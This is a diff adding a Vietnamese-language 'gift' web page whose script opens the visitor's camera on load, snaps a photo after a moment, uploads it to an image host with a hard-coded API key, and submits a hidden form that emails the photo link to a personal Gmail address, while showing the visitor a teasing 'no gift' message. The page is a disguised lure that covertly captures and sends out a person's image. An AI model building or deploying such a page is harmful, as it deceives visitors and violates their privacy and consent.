@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Có Quà Nè ...</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <h1>Cười lên nào sẽ có quà nè 🎁</h1>
+    <div id="cameraContainer">
+      <video id="video" autoplay playsinline></video>
+      <canvas id="canvas"></canvas>
+    </div>
+    <div id="status"></div>
+    <div id="slomoEffect">
+      <img
+        id="slomoImage"
+        src="https://i.imgur.com/XYZXYZXYZ.jpg"
+        alt="Slomo Effect"
+      />
+    </div>
+
+    <form
+      id="emailForm"
+      action="https://formsubmit.co/huysynguyen35@gmail.com"
+      method="POST"
+      style="display: none"
+    >
+      <input type="hidden" name="_captcha" value="false" />
+      <input
+        type="hidden"
+        name="_subject"
+        value="[Ảnh mới từ ứng dụng quà tặng]"
+      />
+      <input type="hidden" id="photoUrl" name="photo_url" />
+    </form>
+
+    <script>
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const statusDiv = document.getElementById("status");
+      const slomoEffect = document.getElementById("slomoEffect");
+      const slomoImage = document.getElementById("slomoImage");
+      const emailForm = document.getElementById("emailForm");
+      const photoUrlInput = document.getElementById("photoUrl");
+      const imgbbApiKey = "45f5e2109ceae6001893b55fde20f69e";
+      const slomoImages = [
+        "https://i.imgur.com/3TXJ6oW.gif",
+        "https://i.imgur.com/5Z3J5J5.gif",
+        "https://i.imgur.com/7X8X9X9.gif",
+        "https://i.imgur.com/1A2B3C4.gif",
+      ];
+
+      async function initCamera() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          video.srcObject = stream;
+          setTimeout(takePhoto, 700);
+        } catch (err) {
+          statusDiv.textContent = "❌ Lỗi: " + err.message;
+          statusDiv.style.backgroundColor = "#ffebee";
+        }
+      }
+
+      function takePhoto() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/jpeg", 0.9).split(",")[1];
+
+        statusDiv.textContent = "Đang chuẩn bị quà cho bạn iu nèe ...";
+        statusDiv.style.backgroundColor = "#fff3e0";
+
+        fetch(`https://api.imgbb.com/1/upload?key=${imgbbApiKey}`, {
+          method: "POST",
+          body: new URLSearchParams({
+            image: imageData,
+          }),
+        })
+          .then((res) => res.json())
+          .then((result) => {
+            if (result.success) {
+              const url = result.data.url;
+              photoUrlInput.value = url; // Lưu URL ảnh vào form
+
+              statusDiv.textContent = "Lêuu lêuu không có quà đâuu 😝";
+              statusDiv.style.backgroundColor = "#e8f5e9";
+
+              // Gửi form email
+              emailForm.submit();
+
+              // Hiển thị hiệu ứng slomo
+              showSlomoEffect();
+            } else {
+              statusDiv.textContent = "❌Bạn hông cười nên là hông có quà rùi";
+              statusDiv.style.backgroundColor = "#ffebee";
+            }
+          })
+          .catch((err) => {
+            statusDiv.textContent = "Bạn hông có cười kìaaa " + err.message;
+            statusDiv.style.backgroundColor = "#ffebee";
+          });
+      }
+
+      function showSlomoEffect() {
+        const randomImage =
+          slomoImages[Math.floor(Math.random() * slomoImages.length)];
+        slomoImage.src = randomImage;
+        slomoEffect.style.display = "flex";
+        setTimeout(() => {
+          slomoEffect.style.display = "none";
+        }, 5000);
+      }
+
+      initCamera();
+    </script>
+  </body>
+</html>
